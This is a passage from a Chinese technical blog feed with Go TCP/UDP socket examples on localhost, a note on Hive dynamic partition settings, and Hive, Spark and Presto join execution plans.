class="line">	<span class="comment">//针对当前信息做数据发送和接受操作</span></span><br><span class="line">	<span class="keyword">for</span> &#123;</span><br><span class="line">		reader := bufio.NewReader(conn)</span><br><span class="line">		<span class="keyword">var</span> buf [<span class="number">128</span>]<span class="keyword">byte</span></span><br><span class="line">		n, err := reader.Read(buf[:]) <span class="comment">//将读取的信息输入到buf里，返回的n是信息的长度</span></span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			fmt.Printf(<span class="string">&quot;read from conn failed, err:%v\n&quot;</span>, err)</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		&#125;</span><br><span class="line">		recv := <span class="keyword">string</span>(buf[:n])</span><br><span class="line">		fmt.Println(<span class="string">&quot;接收到的数据：&quot;</span>, recv)</span><br><span class="line">		conn.Write([]<span class="keyword">byte</span>(<span class="string">&quot;OK&quot;</span>)) <span class="comment">//把信息写回客户端</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">//1.启动连接</span></span><br><span class="line">	listen, err := net.Listen(<span class="string">&quot;tcp&quot;</span>, <span class="string">&quot;127.0.0.1:20000&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Printf(<span class="string">&quot;listen failed, err:%v\n&quot;</span>, err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> &#123;</span><br><span class="line">		<span class="comment">//2.启动监听，等待客户端连接</span></span><br><span class="line">		conn, err := listen.Accept()</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			fmt.Printf(<span class="string">&quot;accept failed, err:%v\n&quot;</span>, err)</span><br><span class="line">			<span class="keyword">continue</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//3.启动一个单独的goroutine去处理连接</span></span><br><span class="line">		<span class="keyword">go</span> process(conn)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="client"><a href="#client" class="headerlink" title="client"></a>client</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;bufio&quot;</span></span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;net&quot;</span></span><br><span class="line">	<span class="string">&quot;os&quot;</span></span><br><span class="line">	<span class="string">&quot;strings&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">//1.与服务端建立连接</span></span><br><span class="line">	conn, err := net.Dial(<span class="string">&quot;tcp&quot;</span>, <span class="string">&quot;127.0.0.1:20000&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Printf(<span class="string">&quot;dial failed, err:%v\n&quot;</span>, err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//2.利用该连接处理数据的发送和接收</span></span><br><span class="line">	input := bufio.NewReader(os.Stdin) <span class="comment">//先创建一个读的对象，从终端里读取</span></span><br><span class="line">	<span class="keyword">for</span> &#123;</span><br><span class="line">		s, _ := input.ReadString(<span class="string">&#x27;\n&#x27;</span>) <span class="comment">//读到回车为止</span></span><br><span class="line">		s = strings.Trim(s, <span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line">		<span class="keyword">if</span> strings.ToUpper(s) == <span class="string">&quot;Q&quot;</span> &#123;</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">		_, err := conn.Write([]<span class="keyword">byte</span>(s))</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			fmt.Printf(<span class="string">&quot;send failed, err:%v\n&quot;</span>, err)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// 从服务端接收回复的消息</span></span><br><span class="line">		<span class="keyword">var</span> buf [<span class="number">1024</span>]<span class="keyword">byte</span></span><br><span class="line">		n, err := conn.Read(buf[:])</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			fmt.Printf(<span class="string">&quot;read failed, err:%v\n&quot;</span>, err)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">		fmt.Println(<span class="string">&quot;受到服务端回复：&quot;</span>, <span class="keyword">string</span>(buf[:n]))</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="UDP"><a href="#UDP" class="headerlink" title="UDP"></a>UDP</h3><h4 id="server-1"><a href="#server-1" class="headerlink" title="server"></a>server</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;net&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	listen, err := net.ListenUDP(<span class="string">&quot;udp&quot;</span>, &amp;net.UDPAddr&#123;</span><br><span class="line">		IP:   net.IPv4(<span class="number">127</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>),</span><br><span class="line">		Port: <span class="number">30000</span>,</span><br><span class="line">	&#125;)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;listen failed, err:&quot;</span>, err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">defer</span> listen.Close()</span><br><span class="line">	<span class="keyword">for</span> &#123;</span><br><span class="line">		<span class="keyword">var</span> data [<span class="number">1024</span>]<span class="keyword">byte</span></span><br><span class="line">		n, addr, err := listen.ReadFromUDP(data[:]) <span class="comment">// 接收数据</span></span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			fmt.Println(<span class="string">&quot;read udp failed, err:&quot;</span>, err)</span><br><span class="line">			<span class="keyword">continue</span></span><br><span class="line">		&#125;</span><br><span class="line">		fmt.Printf(<span class="string">&quot;data:%v addr:%v count:%v\n&quot;</span>, <span class="keyword">string</span>(data[:n]), addr, n)</span><br><span class="line">		_, err = listen.WriteToUDP(data[:n], addr) <span class="comment">// 发送数据</span></span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			fmt.Println(<span class="string">&quot;write to udp failed, err:&quot;</span>, err)</span><br><span class="line">			<span class="keyword">continue</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="client-1"><a href="#client-1" class="headerlink" title="client"></a>client</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;net&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	socket, err := net.DialUDP(<span class="string">&quot;udp&quot;</span>, <span class="literal">nil</span>, &amp;net.UDPAddr&#123;</span><br><span class="line">		IP:   net.IPv4(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>),</span><br><span class="line">		Port: <span class="number">30000</span>,</span><br><span class="line">	&#125;)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;连接服务端失败，err:&quot;</span>, err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">defer</span> socket.Close()</span><br><span class="line">	sendData := []<span class="keyword">byte</span>(<span class="string">&quot;Hello server&quot;</span>)</span><br><span class="line">	_, err = socket.Write(sendData) <span class="comment">// 发送数据</span></span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;发送数据失败，err:&quot;</span>, err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	data := <span class="built_in">make</span>([]<span class="keyword">byte</span>, <span class="number">4096</span>)</span><br><span class="line">	n, remoteAddr, err := socket.ReadFromUDP(data) <span class="comment">// 接收数据</span></span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;接收数据失败，err:&quot;</span>, err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Printf(<span class="string">&quot;recv:%v addr:%v count:%v\n&quot;</span>, <span class="keyword">string</span>(data[:n]), remoteAddr, n)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>GO</tag>
      </tags>
  </entry>
  <entry>
    <title>Hive Dynamic Partition</title>
    <url>/2021/08/06/Hive%20Dynamic%20Partition/</url>
    <content><![CDATA[<p>今天遇到一个知识点</p>
<p><a href="https://blog.csdn.net/qq_26937525/article/details/54946281">参考链接1</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/96732532">参考链接2</a></p>
<span id="more"></span>

<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>不指定分区的时候，数据会放在hdfs的什么路径上呢？</p>
<p>因为hive中分区字段有NULL值，当hive中分区字段有NULL值时，hive会使用dynamic partition，数据会放到一个特殊的分区，这个分区由参数“hive.exec.default.partition.name”控制，默认为“__HIVE_DEFAULT_PARTITION__”</p>
<h2 id="相关参数"><a href="#相关参数" class="headerlink" title="相关参数"></a>相关参数</h2><p>使用动态分区需要注意设定以下参数：</p>
<ul>
<li><strong>hive.exec.dynamic.partition</strong></li>
</ul>
<p>默认值：false</p>
<p>是否开启动态分区功能，默认false关闭。</p>
<p>使用动态分区时候，该参数必须设置成true;</p>
<ul>
<li><strong>hive.exec.dynamic.partition.mode</strong></li>
</ul>
<p>默认值：strict</p>
<p>动态分区的模式，默认strict，表示必须指定至少一个分区为静态分区，nonstrict模式表示允许所有的分区字段都可以使用动态分区。</p>
<p>一般需要设置为nonstrict</p>
<ul>
<li><strong>hive.exec.max.dynamic.partitions.pernode</strong></li>
</ul>
<p>默认值：100</p>
<p>在每个执行MR的节点上，最大可以创建多少个动态分区。</p>
<p>该参数需要根据实际的数据来设定。</p>
<p>比如：源数据中包含了一年的数据，即day字段有365个值，那么该参数就需要设置成大于365，如果使用默认值100，则会报错。</p>
<ul>
<li><strong>hive.exec.max.dynamic.partitions</strong></li>
</ul>
<p>默认值：1000</p>
<p>在所有执行MR的节点上，最大一共可以创建多少个动态分区。</p>
<p>同上参数解释。</p>
<ul>
<li><strong>hive.exec.max.created.files</strong></li>
</ul>
<p>默认值：100000</p>
<p>整个MR Job中，最大可以创建多少个HDFS文件。</p>
<p>一般默认值足够了，除非你的数据量非常大，需要创建的文件数大于100000，可根据实际情况加以调整。</p>
<ul>
<li><strong>hive.error.on.empty.partition</strong></li>
</ul>
<p>默认值：false</p>
<p>当有空分区生成时，是否抛出异常。</p>
<p>一般不需要设置。</p>
<p> 上面的需求可以使用如下的语句来完成：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SET</span> hive.exec.dynamic.partition<span class="operator">=</span><span class="literal">true</span>;  </span><br><span class="line"><span class="keyword">SET</span> hive.exec.dynamic.partition.mode<span class="operator">=</span>nonstrict; </span><br><span class="line"><span class="keyword">SET</span> hive.exec.max.dynamic.partitions.pernode <span class="operator">=</span> <span class="number">1000</span>;</span><br><span class="line"><span class="keyword">SET</span> hive.exec.max.dynamic.partitions<span class="operator">=</span><span class="number">1000</span>;</span><br></pre></td></tr></table></figure>

<h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> staged_employees se</span><br><span class="line"><span class="keyword">INSERT</span> OVERWRITE <span class="keyword">TABLE</span> employees</span><br><span class="line">	<span class="keyword">PARTITION</span> (country <span class="operator">=</span> <span class="string">&#x27;中国&#x27;</span>, state <span class="operator">=</span> <span class="string">&#x27;河北省&#x27;</span>)</span><br><span class="line">	<span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">WHERE</span> se.cnty <span class="operator">=</span> <span class="string">&#x27;中国&#x27;</span> <span class="keyword">AND</span> se.st <span class="operator">=</span> <span class="string">&#x27;河北省&#x27;</span></span><br><span class="line"><span class="keyword">INSERT</span> OVERWRITE <span class="keyword">TABLE</span> employees</span><br><span class="line">	<span class="keyword">PARTITION</span> (country <span class="operator">=</span> <span class="string">&#x27;中国&#x27;</span>, state <span class="operator">=</span> <span class="string">&#x27;陕西省&#x27;</span>)</span><br><span class="line">	<span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">WHERE</span> se.cnty <span class="operator">=</span> <span class="string">&#x27;中国&#x27;</span> <span class="keyword">AND</span> se.st <span class="operator">=</span> <span class="string">&#x27;陕西省&#x27;</span></span><br><span class="line"><span class="keyword">INSERT</span> OVERWRITE <span class="keyword">TABLE</span> employees</span><br><span class="line">	<span class="keyword">PARTITION</span> (country <span class="operator">=</span> <span class="string">&#x27;中国&#x27;</span>, state <span class="operator">=</span> <span class="string">&#x27;河南省&#x27;</span>)</span><br><span class="line">	<span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">WHERE</span> se.cnty <span class="operator">=</span> <span class="string">&#x27;US&#x27;</span> <span class="keyword">AND</span> se.st <span class="operator">=</span> <span class="string">&#x27;河南省&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>中国有23个省，那么我们就需要写23个insert into .. select ..where子句，这非常不现实。于是hive的一种叫做动态分区的特性就出现了，它能够根据select出来的参数自动推断将数据插入到那个分区中去。本文上面的两种SQL语句设定分区的方式都叫做静态分区插入。</p>
<p>将上一个SQL语句进行改动，会得到以下简洁的新SQL语句：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> OVERWRITE <span class="keyword">TABLE</span> employees</span><br><span class="line"><span class="keyword">PARTITION</span> (country, state)</span><br><span class="line"><span class="keyword">SELECT</span> ..., se.cnty, se.st</span><br><span class="line"><span class="keyword">FROM</span> staged_employees se;</span><br></pre></td></tr></table></figure>

<p>hive先获取select的最后两个位置的se.cnty和se.st参数值，然后将这两个值填写到Insert语句partition中的两个country和state变量中，即动态分区是通过位置来对应分区值的。原始表select出来的值和输出partition的值的关系<strong>仅仅是通过位置来确定的，和名字并没有关系</strong>，比如这里se.cnty和county的名称完全没有关系。</p>
<p>上面的这条SQL语句是对两个分区同时进行了动态设定，如果staged_employees表中有100个国家，每个国家有100个地区，那么该SQL语句自动对每个国家和地区建立相应的partition并插入数据，如果用手写的话不现实。</p>
<p>只要位置正确，你可以混用动态分区和静态分区值设定，比如下面这个例子，你可以静态指定一个country值，但是state值采用动态的方法设定：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> OVERWRITE <span class="keyword">TABLE</span> employees</span><br><span class="line"><span class="keyword">PARTITION</span> (country <span class="operator">=</span> <span class="string">&#x27;US&#x27;</span>, state)</span><br><span class="line"><span class="keyword">SELECT</span> ..., se.cnty, se.st</span><br><span class="line"><span class="keyword">FROM</span> staged_employees se</span><br><span class="line"><span class="keyword">WHERE</span> se.cnty <span class="operator">=</span> <span class="string">&#x27;US&#x27;</span>; </span><br></pre></td></tr></table></figure>

<p>注意：静态分区值必须在动态分区值的前面！</p>
]]></content>
      <tags>
        <tag>Big Data</tag>
        <tag>Hive</tag>
      </tags>
  </entry>
  <entry>
    <title>Hive/spark/presto join策略</title>
    <url>/2021/07/10/Hivesparkpresto%20join%E7%AD%96%E7%95%A5/</url>
    <content><![CDATA[<p>对hive/spark-sql/presto中的join使用时的策略进行一些分析和理解。</p>
<span id="more"></span>

<p>大表选择big_table，小表选择small table</p>
<h2 id="Sql"><a href="#Sql" class="headerlink" title="Sql"></a>Sql</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">--hive/spark-sql</span></span><br><span class="line">explain</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">max</span>(big.price) price,<span class="built_in">max</span>(small.size) size </span><br><span class="line"><span class="keyword">from</span> big_table big</span><br><span class="line"><span class="keyword">join</span> small <span class="keyword">table</span> small </span><br><span class="line"><span class="keyword">on</span> big.id<span class="operator">=</span>small.id_s <span class="keyword">and</span> big.date<span class="operator">=</span><span class="string">&#x27;2021-06-20&#x27;</span></span><br><span class="line"><span class="keyword">where</span> big.hour<span class="operator">=</span><span class="number">12</span></span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span> big.event;</span><br><span class="line"></span><br><span class="line"><span class="comment">--presto，加上distributed看上去清楚点</span></span><br><span class="line">explain (TYPE DISTRIBUTED)</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">max</span>(big.price) price,<span class="built_in">max</span>(small.size) size </span><br><span class="line"><span class="keyword">from</span> big_table big</span><br><span class="line"><span class="keyword">join</span> small <span class="keyword">table</span> small </span><br><span class="line"><span class="keyword">on</span> big.id<span class="operator">=</span>small.id_s <span class="keyword">and</span> big.date<span class="operator">=</span><span class="string">&#x27;2021-06-20&#x27;</span></span><br><span class="line"><span class="keyword">where</span> big.hour<span class="operator">=</span><span class="number">12</span></span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span> big.event;</span><br></pre></td></tr></table></figure>

<h3 id="hive"><a href="#hive" class="headerlink" title="hive"></a>hive</h3><p>执行计划如下。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">STAGE DEPENDENCIES:</span><br><span class="line">  Stage-6 is a root stage , consists of Stage-7, Stage-1</span><br><span class="line">  Stage-7 has a backup stage: Stage-1</span><br><span class="line">  Stage-4 depends on stages: Stage-7</span><br><span class="line">  Stage-2 depends on stages: Stage-1, Stage-4</span><br><span class="line">  Stage-1</span><br><span class="line">  Stage-0 depends on stages: Stage-2</span><br><span class="line"></span><br><span class="line">STAGE PLANS:</span><br><span class="line">  Stage: Stage-6</span><br><span class="line">    Conditional Operator</span><br><span class="line"></span><br><span class="line">  Stage: Stage-7</span><br><span class="line">    Map Reduce Local Work</span><br><span class="line">      Alias -&gt; Map Local Tables:</span><br><span class="line">        small</span><br><span class="line">          Fetch Operator</span><br><span class="line">            limit: -1</span><br><span class="line">      Alias -&gt; Map Local Operator Tree:</span><br><span class="line">        small</span><br><span class="line">          TableScan</span><br><span class="line">            alias: small</span><br><span class="line">            Statistics: Num rows: 4319769 Data size: 51837232 Basic stats: COMPLETE Column stats: NONE</span><br><span class="line">            Filter Operator</span><br><span class="line">              predicate: id_s is not null (type: boolean)</span><br><span class="line">              Statistics: Num rows: 2159885 Data size: 25918622 Basic stats: COMPLETE Column stats: NONE</span><br><span class="line">              HashTable Sink Operator</span><br><span class="line">                keys:</span><br><span class="line">                  0 UDFToLong(id) (type: bigint)</span><br><span class="line">                  1 id_s (type: bigint)</span><br><span class="line"></span><br><span class="line">  Stage: Stage-4</span><br><span class="line">    Map Reduce</span><br><span class="line">      Map Operator Tree:</span><br><span class="line">          TableScan</span><br><span class="line">            alias: big</span><br><span class="line">            Statistics: Num rows: 183001809488 Data size: 2196021713880 Basic stats: COMPLETE Column stats: NONE</span><br><span class="line">            Filter Operator</span><br><span class="line">              predicate: (UDFToLong(id) is not null and (hour = 12)) (type: boolean)</span><br><span class="line">              Statistics: Num rows: 45750452372 Data size: 549005428470 Basic stats: COMPLETE Column stats: NONE</span><br><span class="line">              Map Join Operator</span><br><span class="line">                condition map:</span><br><span class="line">                     Inner Join 0 to 1</span><br><span class="line">                keys:</span><br><span class="line">                  0 UDFToLong(id) (type: bigint)</span><br><span class="line">                  1 id_s (type: bigint)</span><br><span class="line">                outputColumnNames: _col27, _col77, _col93</span><br><span class="line">                Statistics: Num rows: 50325498699 Data size: 603905984406 Basic stats: COMPLETE Column stats: NONE</span><br><span class="line">                Group By Operator</span><br><span class="line">                  aggregations: max(_col27), max(_col93)</span><br><span class="line">                  keys: _col77 (type: string)</span><br><span class="line">                  mode: hash</span><br><span class="line">                  outputColumnNames: _col0, _col1, _col2</span><br><span class="line">                  Statistics: Num rows: 50325498699 Data size: 603905984406 Basic stats: COMPLETE Column stats: NONE</span><br><span class="line">                  File Output Operator</span><br><span class="line">                    compressed: true</span><br><span class="line">                    table:</span><br><span class="line">                        input format: org.apache.hadoop.mapred.SequenceFileInputFormat</span><br><span class="line">                        output format: org.apache.hadoop.hive.ql.io.HiveSequenceFileOutputFormat</span><br><span class="line">                        serde: org.apache.hadoop.hive.serde2.lazybinary.LazyBinarySerDe</span><br><span class="line">      Local Work:</span><br><span class="line">        Map Reduce Local Work</span><br><span class="line"></span><br><span class="line">  Stage: Stage-2</span><br><span class="line">    Map Reduce</span><br><span class="line">      Map Operator Tree:</span><br><span class="line">          TableScan</span><br><span class="line">            Reduce Output Operator</span><br><span class="line">              key expressions: _col0 (type: string)</span><br><span class="line">              sort order: +</span><br><span class="line">              Map-reduce partition columns: _col0 (type: string)</span><br><span class="line">              Statistics: Num rows: 50325498699 Data size: 603905984406 Basic stats: COMPLETE Column stats: NONE</span><br><span class="line">              value expressions: _col1 (type: int), _col2 (type: int)</span><br><span class="line">      Reduce Operator Tree:</span><br><span class="line">        Group By Operator</span><br><span class="line">          aggregations: max(VALUE._col0), max(VALUE._col1)</span><br><span class="line">          keys: KEY._col0 (type: string)</span><br><span class="line">          mode: mergepartial</span><br><span class="line">          outputColumnNames: _col0, _col1, _col2</span><br><span class="line">          Statistics: Num rows: 25162749349 Data size: 301952992197 Basic stats: COMPLETE Column stats: NONE</span><br><span class="line">          Select Operator</span><br><span class="line">            expressions: _col1 (type: int), _col2 (type: int)</span><br><span class="line">            outputColumnNames: _col0, _col1</span><br><span class="line">            Statistics: Num rows: 25162749349 Data size: 301952992197 Basic stats: COMPLETE Column stats: NONE</span><br><span class="line">            File Output Operator</span><br><span class="line">              compressed: false</span><br><span class="line">              Statistics: Num rows: 25162749349 Data size: 301952992197 Basic stats: COMPLETE Column stats: NONE</span><br><span class="line">              table:</span><br><span class="line">                  input format: org.apache.hadoop.mapred.TextInputFormat</span><br><span class="line">                  output format: org.apache.hadoop.hive.ql.io.HiveIgnoreKeyTextOutputFormat</span><br><span class="line">                  serde: org.apache.hadoop.hive.serde2.lazy.LazySimpleSerDe</span><br><span class="line"></span><br><span class="line">  Stage: Stage-1</span><br><span class="line">    Map Reduce</span><br><span class="line">      Map Operator Tree:</span><br><span class="line">          TableScan</span><br><span class="line">            alias: big</span><br><span class="line">            Statistics: Num rows: 183001809488 Data size: 2196021713880 Basic stats: COMPLETE Column stats: NONE</span><br><span class="line">            Filter Operator</span><br><span class="line">              predicate: (UDFToLong(id) is not null and (hour = 12)) (type: boolean)</span><br><span class="line">              Statistics: Num rows: 45750452372 Data size: 549005428470 Basic stats: COMPLETE Column stats: NONE</span><br><span class="line">              Reduce Output Operator</span><br><span class="line">                key expressions: UDFToLong(id) (type: bigint)</span><br><span class="line">                sort order: +</span><br><span class="line">                Map-reduce partition columns: UDFToLong(id) (type: bigint)</span><br><span class="line">                Statistics: Num rows: 45750452372 Data size: 549005428470 Basic stats: COMPLETE Column stats: NONE</span><br><span class="line">                value expressions: price (type: int), event (type: string)</span><br><span class="line">          TableScan</span><br><span class="line">            alias: small</span><br><span class="line">            Statistics: Num rows: 4319769 Data size: 51837232 Basic stats: COMPLETE Column stats: NONE</span><br><span class="line">            Filter Operator</span><br><span class="line">              predicate: id_s is not null (type: boolean)</span><br><span class="line">              Statistics: Num rows: 2159885 Data size: 25918622 Basic stats: COMPLETE Column stats: NONE</span><br><span class="line">              Reduce Output Operator</span><br><span class="line">                key expressions: id_s (type: bigint)</span><br><span class="line">                sort order: +</span><br><span class="line">                Map-reduce partition columns: id_s (type: bigint)</span><br><span class="line">                Statistics: Num rows: 2159885 Data size: 25918622 Basic stats: COMPLETE Column stats: NONE</span><br><span class="line">                value expressions: size (type: int)</span><br><span class="line">      Reduce Operator Tree:</span><br><span class="line">        Join Operator</span><br><span class="line">          condition map:</span><br><span class="line">               Inner Join 0 to 1</span><br><span class="line">          keys:</span><br><span class="line">            0 UDFToLong(id) (type: bigint)</span><br><span class="line">            1 id_s (type: bigint)</span><br><span class="line">          outputColumnNames: _col27, _col77, _col93</span><br><span class="line">          Statistics: Num rows: 50325498699 Data size: 603905984406 Basic stats: COMPLETE Column stats: NONE</span><br><span class="line">          Group By Operator</span><br><span class="line">            aggregations: max(_col27), max(_col93)</span><br><span class="line">            keys: _col77 (type: string)</span><br><span class="line">            mode: hash</span><br><span class="line">            outputColumnNames: _col0, _col1, _col2</span><br><span class="line">            Statistics: Num rows: 50325498699 Data size: 603905984406 Basic stats: COMPLETE Column stats: NONE</span><br><span class="line">            File Output Operator</span><br><span class="line">              compressed: true</span><br><span class="line">              table:</span><br><span class="line">                  input format: org.apache.hadoop.mapred.SequenceFileInputFormat</span><br><span class="line">                  output format: org.apache.hadoop.hive.ql.io.HiveSequenceFileOutputFormat</span><br><span class="line">                  serde: org.apache.hadoop.hive.serde2.lazybinary.LazyBinarySerDe</span><br><span class="line"></span><br><span class="line">  Stage: Stage-0</span><br><span class="line">    Fetch Operator</span><br><span class="line">      limit: -1</span><br><span class="line">      Processor Tree:</span><br><span class="line">        ListSink</span><br></pre></td></tr></table></figure>

<p><a href="https://imgtu.com/i/WpG2fe"><img src="https://z3.ax1x.com/2021/07/10/WpG2fe.jpg" alt="WpG2fe.jpg"></a></p>
<p>可以看到按照常理来说，在普通的join当中，左边的表的内容会被加载进内存，但是在本次案例中，依然是右边的表（small table）的内容被加载进了内存。当我们更换join的前后顺序以后，发现依然是小表加载进了内存，因为在hive集群上开启了hive优化，默认将小表入读内存，所以执行普通的join时不用考虑表名的书写顺序。</p>
<h3 id="spark"><a href="#spark" class="headerlink" title="spark"></a>spark</h3><p>大表在左，执行如下。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">== Physical Plan ==</span><br><span class="line">*(3) HashAggregate(keys=[event#81], functions=[max(price#31), max(size#94)])</span><br><span class="line">+- Exchange hashpartitioning(event#81, 200)</span><br><span class="line">   +- *(2) HashAggregate(keys=[event#81], functions=[partial_max(price#31), partial_max(size#94)])</span><br><span class="line">      +- *(2) Project [price#31, event#81, size#94]</span><br><span class="line">         +- *(2) BroadcastHashJoin [cast(id#27 as bigint)], [id_s#88L], Inner, BuildRight</span><br><span class="line">            :- *(2) Project [id#27, price#31, event#81]</span><br><span class="line">            :  +- *(2) Filter ((isnotnull(hour#6) &amp;&amp; (cast(hour#6 as int) = 12)) &amp;&amp; isnotnull(id#27))</span><br><span class="line">            :     +- *(2) FileScan orc big_table[hour#6,id#27,price#31,date#80,event#81] Batched: true, Format: ORC, Location: PrunedInMemoryFileIndex[viewfs://ss-hadoop/mvad/warehouse/mediav_base.db/maxfact/date=2021-06-20/..., PartitionCount: 4, PartitionFilters: [isnotnull(date#80), (date#80 = 2021-06-20)], PushedFilters: [IsNotNull(hour), IsNotNull(id)], ReadSchema: struct&lt;hour:tinyint,id:int,price:int&gt;</span><br><span class="line">            +- BroadcastExchange HashedRelationBroadcastMode(List(input[0, bigint, false]))</span><br><span class="line">               +- *(1) Filter isnotnull(id_s#88L)</span><br><span class="line">                  +- Scan hive small table [id_s#88L, size#94], HiveTableRelation `mysql`.`mediav_base_adspace`, org.apache.hadoop.hive.serde2.lazy.LazySimpleSerDe, [id#82L, name#83, qihu_adspaceid#84L, memo#85, url#86, fixedbannerid#87L, id_s#88L, channelid#89L, disabled#90, width#91, height#92, dimension#93, size#94, bannertypeid#95, pagetype#96, placement#97, spellrate#98, pv#99L, uv#100L, manualflag#101, wh#102, virtual#103L, sflag#104, acceptsize#105, ... 75 more fields]</span><br><span class="line">Time taken: 16.792 seconds, Fetched 1 row(s)</span><br></pre></td></tr></table></figure>

<p>大表在右，执行如下。</p>
